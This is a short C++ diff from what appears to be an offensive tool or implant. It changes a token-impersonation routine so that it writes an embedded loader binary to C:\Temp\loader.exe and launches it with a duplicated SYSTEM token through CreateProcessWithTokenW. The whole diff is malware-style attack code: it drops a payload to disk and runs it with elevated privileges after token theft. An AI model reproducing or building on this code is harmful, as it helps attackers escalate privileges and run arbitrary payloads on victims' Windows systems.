@@ -16,18 +16,24 @@ int wmain() {
 		return 1;
 	}
 
+	// write the loader to disk
+	Log("[+] Dropping loader to disk.", componentName);
+	std::ofstream outfile("C:\\Temp\\loader.exe", std::ios::out | std::ios::binary);
+	outfile.write(&loader[0], sizeof(loader)); // try catch?
+	outfile.close();
+
 	STARTUPINFOW si;
 	PROCESS_INFORMATION pi;
 	ZeroMemory(&si, sizeof(si));
 	ZeroMemory(&pi, sizeof(pi));
 	si.cb = sizeof(si);
 
-	Log("[*] Attempting to create cmd with token.", componentName);
+	Log("[*] Attempting to spawn loader with system token.", componentName);
 
 	if (!CreateProcessWithTokenW(
 		hDuplicateToken,
 		LOGON_WITH_PROFILE,
-		L"loader.exe",
+		L"C:\\Temp\\loader.exe",
 		NULL,
 		0,
 		NULL,
